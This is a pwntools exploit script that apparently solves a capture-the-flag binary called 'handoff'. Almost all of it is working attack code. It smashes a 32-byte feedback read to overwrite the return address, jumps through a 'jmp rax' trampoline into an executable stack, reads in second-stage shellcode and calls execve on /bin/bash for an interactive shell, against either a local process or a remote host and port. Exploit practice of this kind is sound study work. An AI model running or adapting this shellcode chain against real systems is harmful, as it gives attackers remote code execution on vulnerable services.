#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template handoff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'handoff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

RIP_DIST = 20 # cyclic -l 0x6161616761616166
TRAMPOLINE = 0x000000000040116c # jmp rax; no PIE
SECOND_START_BYTE = 17

io.warn("to make asm work on osx run after installing the proper binutils: export PWNLIB_AS=/opt/homebrew/opt/binutils/bin/x86_64-elf-as")
# first xor rax, rax gets trampled by a \0 but doesn't hurt anything here lol
# mov rdx, r11 just gives us a decent nbytes value with fewer bytes than mov.imm
PAYLOAD_STAGE_1 = asm(
        "mov rsi, rax;"
        "xor rdi, rdi;"
        "xor rax, rax;"
        "xor rax, rax;"
        "mov rdx, r11;"
        "syscall;"
        )

SHELL_COMMAND = b'/bin/bash\0'

# this just sets up execve
# moves the buffer into rdi, nulls rdi and rdx, sets rdx to 59
PAYLOAD_STAGE_2 = asm(
        "mov rdi, rsi;"
        "mov rsi, r9;"
        "mov rdx, r9;"
        "mov eax, 59;"
        "syscall;"
        )

io = start()

io.info("exit asks for feedback, reads NAME_LENGTH bytes (32) into feedback (8 bytes). simple stack smash")
io.info("stack is rwxp so we can use classical exploitation.")
io.info("we can use a trampoline instruction (baby rop) to jmp rax, which just so happens to point at our")
io.info("buffer. from there we'll read a second stage shellcode in so we have more than 32 bytes and we're done")

pause()

# only write the last 7 bytes of PUTS_GOT because it's going to jump 
io.sendline(b"3")
io.readuntil(b"Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ")
io.sendline( PAYLOAD_STAGE_1 + b'A' * (RIP_DIST - len(PAYLOAD_STAGE_1)) + p64(TRAMPOLINE))
io.info(f"sending second stage payload...execution will start at byte {SECOND_START_BYTE}....")

io.sendline(SHELL_COMMAND + b'A' * (SECOND_START_BYTE - len(SHELL_COMMAND)) + PAYLOAD_STAGE_2)

io.interactive()

